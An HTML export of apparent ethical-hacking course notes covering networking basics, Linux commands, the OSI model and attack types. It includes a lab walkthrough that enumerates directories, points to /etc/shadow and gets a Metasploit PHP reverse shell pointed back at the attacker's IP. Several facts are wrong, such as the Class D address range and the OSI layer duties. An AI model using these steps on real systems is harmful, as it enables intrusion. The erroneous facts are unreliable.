@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Notes.md</title>
+    <meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+    
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+html,footer,header{
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Custom MD PDF CSS
+ */
+html,footer,header{
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+
+ }
+body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+<link rel="stylesheet" href="file:///r%3A/2.Travail/1.Enseignement/Cours/_1.Outils/2.Developpement/1.SCSS/main.css" type="text/css"><link rel="stylesheet" href="file:///d%3A/rdaros/Cours/_1.Outils/2.Developpement/1.SCSS/main.css" type="text/css">
+</head>
+
+<body>
+    <h1 id="types-of-hackers">Types of Hackers</h1>
+<ol>
+<li>
+<p><strong>White Hat Hacker:</strong></p>
+<ul>
+<li>Performs hacking with the permission of the organization or owner.</li>
+</ul>
+</li>
+<li>
+<p><strong>Black Hat Hacker:</strong></p>
+<ul>
+<li>Performs hacking without permission and for personal gain.</li>
+</ul>
+</li>
+<li>
+<p><strong>Grey Hat Hacker:</strong></p>
+<ul>
+<li>Performs hacking for personal gain and for ethical hacking.</li>
+</ul>
+</li>
+<li>
+<p><strong>Script Kiddies:</strong></p>
+<ul>
+<li>Individuals who use tools developed by others to perform hacking.</li>
+</ul>
+</li>
+<li>
+<p><strong>Hacktivist:</strong></p>
+<ul>
+<li>Performs hacking for a cause, mainly for political or social reasons.</li>
+</ul>
+</li>
+<li>
+<p><strong>Professional Hacker:</strong></p>
+<ul>
+<li>Performs hacking for a living, highly skilled, and creates their own tools.</li>
+</ul>
+</li>
+<li>
+<p><strong>Malicious Hacker:</strong></p>
+<ul>
+<li>Performs hacking for personal gain, highly skilled, creates their own tools, and is very dangerous.</li>
+</ul>
+</li>
+</ol>
+<h1 id="vmware---kali-linux-settings">VMware - Kali Linux Settings</h1>
+<h2 id="memory">Memory:</h2>
+<ul>
+<li><strong>RAM</strong></li>
+</ul>
+<h2 id="network-connection">Network Connection:</h2>
+<ul>
+<li><strong>NAT:</strong>
+<ul>
+<li>Used to convert private IP addresses to public IP addresses.</li>
+</ul>
+</li>
+<li><strong>Bridged:</strong>
+<ul>
+<li>Connects the virtual machine to the physical network.</li>
+</ul>
+</li>
+<li><strong>Virtual Network:</strong>
+<ul>
+<li>Connects the virtual machine to the virtual network.</li>
+</ul>
+</li>
+</ul>
+<h1 id="ip-address">IP Address</h1>
+<ul>
+<li>
+<p><strong>Class A:</strong></p>
+<ul>
+<li>0.0.0.0 to 127.255.255.255</li>
+</ul>
+</li>
+<li>
+<p><strong>Class B:</strong></p>
+<ul>
+<li>128.0.0.0 to 191.255.255.255</li>
+</ul>
+</li>
+<li>
+<p><strong>Class C:</strong></p>
+<ul>
+<li>192.0.0.0 to 223.255.255.255</li>
+</ul>
+</li>
+<li>
+<p><strong>Class D:</strong></p>
+<ul>
+<li>24.0.0.0 to 239.255.255.255</li>
+</ul>
+</li>
+<li>
+<p><strong>Class E:</strong></p>
+<ul>
+<li>240.0.0.0 to 255.255.255.255</li>
+</ul>
+</li>
+<li>
+<p><strong>Loopback:</strong></p>
+<ul>
+<li>127.0.0.1</li>
+</ul>
+</li>
+</ul>
+<h1 id="subnetting">Subnetting</h1>
+<ul>
+<li>The process of splitting one IP address into multiple IP addresses.</li>
+</ul>
+<h1 id="subnet-masking">Subnet Masking</h1>
+<ul>
+<li>
+<p><strong>Mask IP address:</strong></p>
+<ul>
+<li>Class A: 255.0.0.0</li>
+<li>Class B: 255.255.0.0</li>
+<li>Class C: 255.255.255.0</li>
+</ul>
+</li>
+</ul>
+<h2 id="steps">Steps</h2>
+<ol>
+<li>Identify the class of the IP address.</li>
+<li>Write the subnet mask of the IP address.</li>
+<li>Convert the subnet mask to binary.</li>
+<li>Add two 1's to the left of the ones in the binary of the subnet mask.</li>
+<li>Convert the binary to decimal (New subnet mask ID).</li>
+<li>Calculate IP addresses per subnet using the formula 2^n, where n is the number of zeros in the subnet mask binary.</li>
+</ol>
+<h2 id="formulas">Formulas</h2>
+<ul>
+<li><strong>No. of IP Addresses per subnet:</strong>
+<ul>
+<li>2^n, where n is the number of zeros in the subnet mask binary.</li>
+</ul>
+</li>
+<li><strong>No. of Subnets:</strong>
+<ul>
+<li>2^n, where n is the number of ones added.</li>
+</ul>
+</li>
+<li><strong>No. of Hosts per subnet:</strong>
+<ul>
+<li><code>No. of IP addresses - 2</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="example">Example</h2>
+<ul>
+<li>IP Address: 192.168.10.0/26
+<ul>
+<li>Class C</li>
+<li>Subnet Mask: 255.255.255.0</li>
+<li>New Subnet Mask ID: 255.255.255.192</li>
+<li>No. of IP Addresses: 2^6 = 64</li>
+</ul>
+</li>
+</ul>
+<h1 id="phases-of-hacking">Phases of Hacking</h1>
+<ol>
+<li>
+<p><strong>Reconnaissance or Footprinting:</strong></p>
+<ul>
+<li>Gathering information about the target.</li>
+</ul>
+</li>
+<li>
+<p><strong>Scanning and Analysis:</strong></p>
+<ul>
+<li>Scanning the target for vulnerabilities.</li>
+</ul>
+</li>
+<li>
+<p><strong>Gaining Access:</strong></p>
+<ul>
+<li>Gaining access to the target.</li>
+</ul>
+</li>
+<li>
+<p><strong>Maintaining Access:</strong></p>
+<ul>
+<li>Maintaining access to the target.</li>
+</ul>
+</li>
+<li>
+<p><strong>Clearing Footprints:</strong></p>
+<ul>
+<li>Clearing the footprints from the target.</li>
+</ul>
+</li>
+</ol>
+<h2 id="footprinting-tools">Footprinting Tools</h2>
+<ul>
+<li><strong>Shodan</strong></li>
+</ul>
+<h1 id="flags-used-in-networks">Flags Used in Networks</h1>
+<ul>
+<li><code>syn</code>: Synchronization - Used to establish a connection.</li>
+<li><code>ack</code>: Acknowledgment - Indicates that the packet is received.</li>
+<li><code>rst</code>: Reset - Used to reset the connection.</li>
+<li><code>fin</code>: Finish - Used to terminate the connection.</li>
+<li><code>urg</code>: Urgent - Indicates the criticality of the packet.</li>
+</ul>
+<h1 id="basic-commands">Basic Commands</h1>
+<ul>
+<li><code>ip a</code></li>
+<li><code>ifconfig</code></li>
+<li><code>ping</code></li>
+</ul>
+<h1 id="nmap">Nmap</h1>
+<h4 id="rtfm">RTFM</h4>
+<ul>
+<li><code>man nmap</code> (for manual)</li>
+<li><code>nmap -sS</code> (Stealth scan)</li>
+<li><code>nmap -A &lt;IP&gt;</code> (Aggressive scan)</li>
+</ul>
+<h1 id="basic-linux-commands">Basic Linux Commands</h1>
+<ul>
+<li><code>ls</code>: List files and directories.</li>
+<li><code>ls -la</code>: List all files and directories, including hidden ones.</li>
+<li><code>sudo su</code>: Switch to the root user.</li>
+<li><code>sudo [command]</code>: Run a command as the root user.
+<ul>
+<li>Example: <code>sudo nmap -sS 127.0.0.1</code></li>
+</ul>
+</li>
+<li><code>exit</code>: Exit from the terminal.</li>
+<li><code>ifconfig</code> / <code>ip a</code> / <code>ifconfig</code>: Show network interfaces.</li>
+<li><code>chmod</code>: Change mode, change permissions of a file or directory.</li>
+<li><code>chmod +x &lt;file&gt;</code>: Give execute permission to a file.</li>
+<li><code>chmod -x &lt;file&gt;</code>: Remove execute permission from a file.</li>
+<li><code>chmod 777 &lt;file&gt;</code>: Give all permissions to a file.</li>
+<li><code>touch &lt;file&gt;</code>: Create a file.</li>
+<li><code>mkdir &lt;directory&gt;</code>: Make directory, create a directory.</li>
+<li><code>rm -rf &lt;file/directory&gt;</code>: Remove a file or directory completely.</li>
+<li><code>rm &lt;file&gt;</code>: Remove a file or empty directory.</li>
+<li><code>cp &lt;file&gt; &lt;destination&gt;</code>: Copy a file to a destination.</li>
+<li><code>mv &lt;file&gt; &lt;destination&gt;</code>: Move a file to a destination.</li>
+<li><code>cd &lt;directory&gt;</code>: Change directory.</li>
+<li><code>pwd</code>: Print working directory.</li>
+<li><code>systemctl restart NetworkManager</code>: Restart network manager. (Useful when you change network settings)</li>
+<li><code>whoami</code>: Print current user.</li>
+<li><code>cat &lt;file&gt;</code>: Print contents of a file.</li>
+<li><code>head &lt;file&gt;</code>: Print first 10 lines of a file.</li>
+<li><code>tail &lt;file&gt;</code>: Print last 10 lines of a file.</li>
+</ul>
+<h1 id="system-hacking---sarvm">System Hacking - SARVM</h1>
+<p>s</p>
+<h2 id="step-1-find-target-ip-address">Step 1: Find Target IP Address</h2>
+<ul>
+<li>Use <code>netdiscover</code> to discover the target IP address.
+<ul>
+<li>Example IP: <code>192.168.19.131</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="step-2-directory-enumeration">Step 2: Directory Enumeration</h2>
+<ul>
+<li>Use <code>gobuster</code> for directory enumeration.
+<ul>
+<li>Command: <code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.19.131/ -x &quot;txt&quot;</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="step-3-explore-system-files">Step 3: Explore System Files</h2>
+<ul>
+<li>Explore important system files:
+<ul>
+<li><code>/etc/passwd</code>: File containing the username and password of the system.</li>
+<li><code>/etc/shadow</code>: File containing the password information of the system.</li>
+<li>Note: In Linux, usernames in <code>/etc/passwd</code> with values over 1000 are normal users.</li>
+</ul>
+</li>
+</ul>
+<h2 id="step-5-exploit-and-gain-access">Step 5: Exploit and Gain Access</h2>
+<ul>
+<li>Gain reverse shell access using metasploit.</li>
+<li>msfconsole
+<ol>
+<li>Use <code>use exploit/multi/script/web_delivery</code>.</li>
+<li>Set the payload to PHP reverse shell: <code>set payload php/meterpreter/reverse_tcp</code>.</li>
+<li>Set the target to PHP: <code>set target 1</code>.</li>
+<li>Set the listen host to the attacker's IP: <code>set lhost &lt;IP_OF_ATTACKER&gt;</code>.</li>
+<li>Set the listen port (e.g., 8888 for HTTP): <code>set lport 8888</code>.</li>
+<li>Execute the exploit: <code>exploit</code>.</li>
+<li>Copy the generated code and paste it on the target site.</li>
+<li>List sessions: <code>sessions</code>.</li>
+<li>Start the session: <code>sessions -i 1</code>.</li>
+<li>Start the shell: <code>shell</code>.</li>
+<li>Check the current user: <code>whoami</code>.</li>
+<li>Spawn a bash shell: <code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code>.<br>
+-got reverse shell</li>
+</ol>
+</li>
+<li>Explore the files 13. Change directory to Desktop: <code>cd /home/&lt;username&gt;/Desktop</code>. 14. Print the contents of user.txt: <code>cat user.txt</code>.</li>
+</ul>
+<h1 id="kali-commands">Kali Commands</h1>
+<ul>
+<li>
+<p><code>passwd &lt;username&gt;</code>: Change password of a user.</p>
+</li>
+<li>
+<p><code>ssh &lt;username&gt;@&lt;ip_address&gt;</code>: SSH into a remote machine.</p>
+</li>
+<li>
+<p><code>crunch &lt;min_length&gt; &lt;max_length&gt; &lt;characters&gt; &gt; &lt;filename&gt;</code>: Generate a wordlist.</p>
+</li>
+</ul>
+<h1 id="malware-family">Malware Family</h1>
+<ol>
+<li>
+<p><strong>Virus:</strong></p>
+<ul>
+<li>Disrupts normal system functioning by attaching to host files.</li>
+</ul>
+</li>
+<li>
+<p><strong>Worm:</strong></p>
+<ul>
+<li>Standalone malware that replicates itself to spread to other computers.</li>
+</ul>
+</li>
+<li>
+<p><strong>Trojan:</strong></p>
+<ul>
+<li>Disguised as legitimate software to gain unauthorized access.</li>
+</ul>
+</li>
+<li>
+<p><strong>Ransomware:</strong></p>
+<ul>
+<li>Encrypts files and demands a ransom for the decryption key.</li>
+</ul>
+</li>
+<li>
+<p><strong>Adware:</strong></p>
+<ul>
+<li>Automatically displays or downloads unwanted advertising material when a user is online.</li>
+</ul>
+</li>
+<li>
+<p><strong>Spyware:</strong></p>
+<ul>
+<li>Monitors user activities and sends information to a third party without consent.</li>
+</ul>
+</li>
+<li>
+<p><strong>Insider Attack:</strong></p>
+<ul>
+<li>Malicious attack perpetrated on a network or computer system by a person with authorized system access.</li>
+</ul>
+</li>
+</ol>
+<h1 id="osi-model">OSI Model</h1>
+<ul>
+<li>
+<p>OSI Model is a conceptual model that characterizes the communication functions of a telecommunication system without regard to their underlying internal structure and technology.</p>
+<h2 id="7-layers-of-osi-model">7 Layers of OSI Model</h2>
+<ol>
+<li>
+<p>Physical Layer</p>
+</li>
+<li>
+<p>Data Link Layer</p>
+</li>
+<li>
+<p>Network Layer</p>
+</li>
+<li>
+<p>Transport Layer</p>
+</li>
+<li>
+<p>Session Layer</p>
+</li>
+<li>
+<p>Presentation Layer</p>
+</li>
+<li>
+<p>Application Layer</p>
+<h3 id="1-physical-layer">1. Physical Layer</h3>
+<ul>
+<li>It is the lowest layer of the OSI Model.</li>
+<li>It is responsible for the actual physical connection between the devices.</li>
+<li>It contains information in the form of bits.</li>
+<li>It concerns with process to process delivery.</li>
+</ul>
+<h3 id="2-data-link-layer">2. Data Link Layer</h3>
+<ul>
+<li>It is responsible for the node to node delivery of the message.</li>
+<li>The main function of this layer is to make sure data transfer is error-free.</li>
+</ul>
+<h3 id="3-network-layer">3. Network Layer</h3>
+<ul>
+<li>It is responsible for the source to destination delivery of the packet across multiple networks.</li>
+</ul>
+<h3 id="4-transport-layer">4. Transport Layer</h3>
+<ul>
+<li>The data is transferred in the form of segments.</li>
+<li>It is responsible for the end-to-end delivery of the entire message.</li>
+</ul>
+<h3 id="5-session-layer">5. Session Layer</h3>
+<ul>
+<li>It is responsible for establishing, maintaining and terminating the connection between the local and remote application.</li>
+<li>It is also responsible for security by means of encryption and decryption.</li>
+</ul>
+<h3 id="6-presentation-layer">6. Presentation Layer</h3>
+<ul>
+<li>It is also called the translation layer.</li>
+<li>The data from the application layer is extracted and manipulated here.</li>
+</ul>
+<h3 id="7-application-layer">7. Application Layer</h3>
+<ul>
+<li>It is the topmost layer of the OSI Model.</li>
+<li>This is the layer where the data is generated.</li>
+<li>This layer serves as a window for the application services to access the network and for displaying the received information to the user.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h1 id="cia-triad">CIA Triad</h1>
+<ul>
+<li>
+<p>CIA Triad is a model designed to guide policies for information security within an organization.</p>
+<h2 id="3-components-of-cia-triad">3 Components of CIA Triad</h2>
+<ol>
+<li>
+<p>Confidentiality</p>
+</li>
+<li>
+<p>Integrity</p>
+</li>
+<li>
+<p>Availability</p>
+<h3 id="1-confidentiality">1. Confidentiality</h3>
+<ul>
+<li>Confidentiality is the property that information is not made available or disclosed to unauthorized individuals, entities, or processes.</li>
+</ul>
+<h3 id="2-integrity">2. Integrity</h3>
+<ul>
+<li>Integrity is the property of being whole and uncorrupted.</li>
+<li>Maintaining the consistency, accuracy, and trustworthiness of data over its entire life cycle.</li>
+</ul>
+<h3 id="3-availability">3. Availability</h3>
+<ul>
+<li>Availability is the property of being accessible and usable upon demand by an authorized entity.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h1 id="authentication">Authentication</h1>
+<ul>
+<li>
+<p>Authentication is the process of verifying the identity of a person or device.</p>
+<h2 id="methods-of-authentication">Methods of Authentication</h2>
+<ul>
+<li>Biometric Authentication</li>
+<li>Single Factor Authentication</li>
+<li>Two Factor Authentication</li>
+<li>Multi Factor Authentication</li>
+</ul>
+</li>
+</ul>
+<h1 id="authorization">Authorization</h1>
+<ul>
+<li>Authorization is the process of giving someone permission to do or have something.</li>
+</ul>
+<h1 id="subject-and-object">Subject and Object</h1>
+<h2 id="example">Example</h2>
+<pre><code>An **employee** is requesting access to a *resource*.&lt;br&gt;
+**Employee** is the **subject** and *resource* is the **object**.
+</code></pre>
+<h1 id="event-and-incident">Event and Incident</h1>
+<ul>
+<li>Every activity that occurs in a system is an event. An event can be a normal or an abnormal activity.</li>
+<li>Every event that has a negative impact on the system is an incident. (Threat to security)</li>
+</ul>
+<h1 id="16925412">169.254.1.2</h1>
+<ul>
+<li>It is also called APIPA (Automatic Private IP Addressing).</li>
+<li>It is a private IP address.</li>
+<li>It is used when a device is unable to obtain an IP address from a DHCP (Dynamic Host Configuration Protocol) server.</li>
+<li>Every 5 minutes, the device checks for a DHCP server. If it finds one, it will obtain an IP address from the DHCP server. If it doesn't find one, it will continue to use the APIPA address.</li>
+<li>DHCP is used to assign IP addresses to devices on a network.</li>
+</ul>
+<h1 id="0000">0.0.0.0</h1>
+<ul>
+<li>It is used as a placeholder, or wild card IP.</li>
+</ul>
+<h1 id="1111">1.1.1.1</h1>
+<ul>
+<li>It is Cloudflare's public DNS resolver.</li>
+<li>It is a DNS (Domain Name System) resolver.</li>
+<li>It is the fastest DNS resolver in the world.</li>
+</ul>
+<h1 id="8888">8.8.8.8</h1>
+<ul>
+<li>It is Google's DNS resolver.</li>
+<li>It is a public IP address.</li>
+</ul>
+<h1 id="types-of-attacks">Types of Attacks</h1>
+<h2 id="malware">Malware</h2>
+<ul>
+<li>Malware is a software that is specifically designed to disrupt, damage, or gain unauthorized access to a computer system.</li>
+</ul>
+<h2 id="denial-of-service-dos">Denial of Service (DoS)</h2>
+<ul>
+<li>Denial of Service (DoS) is an attack that prevents legitimate users from accessing a service.</li>
+</ul>
+<h2 id="distributed-denial-of-service-ddos">Distributed Denial of Service (DDoS)</h2>
+<ul>
+<li>Distributed Denial of Service (DDoS) is an attack that prevents legitimate users from accessing a service by overwhelming the service with traffic from multiple sources.</li>
+</ul>
+<h2 id="phishing">Phishing</h2>
+<ul>
+<li>Phishing is an attack that attempts to steal sensitive information by disguising as a trustworthy entity in an electronic communication.</li>
+</ul>
+<h2 id="vishing">Vishing</h2>
+<ul>
+<li>Vishing is an attack that attempts to steal sensitive information by disguising as a trustworthy entity in a voice communication.</li>
+</ul>
+<h2 id="smishing">Smishing</h2>
+<ul>
+<li>Smishing is an attack that attempts to steal sensitive information by disguising as a trustworthy entity in a text message.</li>
+</ul>
+<h2 id="whaling">Whaling</h2>
+<ul>
+<li>Whaling is an attack that targets high-profile users, such as executives or celebrities.</li>
+</ul>
+<h2 id="dumpster-diving">Dumpster Diving</h2>
+<ul>
+<li>Dumpster Diving is an physical attack that attempts to steal sensitive information by searching through trash/Dumpster/Dustbin.</li>
+</ul>
+<h2 id="someones-trash-is-someones-treasure">Someone's trash is someone's treasure.</h2>
+<ul>
+<li>It means that what is useless to someone may be valuable to someone else.</li>
+</ul>
+<h2 id="shoulder-surfing">Shoulder Surfing</h2>
+<ul>
+<li>Shoulder Surfing is an physical attack that attempts to steal sensitive information by looking over someone's shoulder.</li>
+</ul>
+<h2 id="spear-phishing">Spear Phishing</h2>
+<ul>
+<li>Spear Phishing is targeted phishing.</li>
+</ul>
+<h1 id="introduction-to-cloud">Introduction to Cloud</h1>
+<h2 id="public-cloud">Public Cloud</h2>
+<ul>
+<li>Public Cloud can be accessed by anyone on the internet.</li>
+</ul>
+<h2 id="private-cloud">Private Cloud</h2>
+<ul>
+<li>Private Cloud can be accessed by a single organization or a single entity.</li>
+<li>It is more secure than Public Cloud.</li>
+<li>Stored on the organization's intranet or hosted data center.</li>
+</ul>
+<h2 id="hybrid-cloud">Hybrid Cloud</h2>
+<ul>
+<li>Hybrid Cloud is a combination of Public Cloud and Private Cloud.</li>
+<li>It is more secure than Public Cloud.</li>
+</ul>
+<h1 id="xaas-anything-as-a-service">XaaS (Anything as a Service)</h1>
+<ul>
+<li>XaaS is a collective term that refers to the delivery of anything as a service.</li>
+</ul>
+
+</body>
+
+</html>
